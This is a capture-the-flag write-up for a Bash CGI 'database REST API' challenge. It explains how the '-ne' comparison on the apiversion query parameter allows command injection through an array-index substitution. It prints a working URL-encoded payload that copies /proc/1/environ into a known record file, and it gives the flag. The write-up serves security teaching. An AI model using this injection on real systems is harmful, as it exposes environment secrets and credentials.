---
difficulty: Easy
author: LION
---

### Description
Just a simple enterprise-ready database REST API.
Flag format: `dach2026{...}`
### Walkthrough
We are given a bash script: `file get.cgi` it is a small Bash CGI API. It reads `name`, `password`, and `apiversion` from the query string. The vulnerable line is the version check:
```bash
if [[ "${apiversion}" -ne 1 ]]; then
    ...
fi
```
In Bash, `-ne` triggers arithmetic evaluation. Arithmetic contexts evaluate array indexes, and an array index can contain a command substitution. So a value like this runs `COMMAND`:
```bash
a[$(COMMAND;echo 0)]=1,1
```
The `echo 0` leaves a valid number behind so the arithmetic still succeeds.
**The database.** Records are just files under `/db`, named by the hashes of the username and password:
```bash
password_hash="$(echo "$password" | shasum -a 256 | cut -d' ' -f1)"
name_hash="$(echo "$name" | shasum -a 256 | cut -d' ' -f1)"
cat "/db/$name_hash:$password_hash"
```
### Exploit
There's a known `example:example` record, and the flag lives in the container's environment (readable at `/proc/1/environ`). Rather than trying to capture command output directly, I injected a command to dump that environment over the `example:example` file, then read the record normally.
Injected command:
```bash
tr '\0' '\n' < /proc/1/environ > /db/13550350a8681c84c861aac2e5b440161c2b33a3e4f302ac680ca5b686de48de:13550350a8681c84c861aac2e5b440161c2b33a3e4f302ac680ca5b686de48de
```
The filename is the hash pair for `example`/`example`. URL-encoded into `apiversion`:
```
/get.cgi?name=example&password=example&apiversion=a%5B%24%28tr%20%27%5C0%27%20%27%5Cn%27%20%3C%20%2Fproc%2F1%2Fenviron%20%3E%20%2Fdb%2F13550350a8681c84c861aac2e5b440161c2b33a3e4f302ac680ca5b686de48de%3A13550350a8681c84c861aac2e5b440161c2b33a3e4f302ac680ca5b686de48de%3Becho%200%29%5D%3D1%2C1
```
Then read the record back:
```
/get.cgi?name=example&password=example&apiversion=1
```
This returned the environment, including the flag.
### Flag
```
dach2026{bash_cgi_scripts_what_could_go_wrong_GZbGoEbKlnJHrBc69w}
```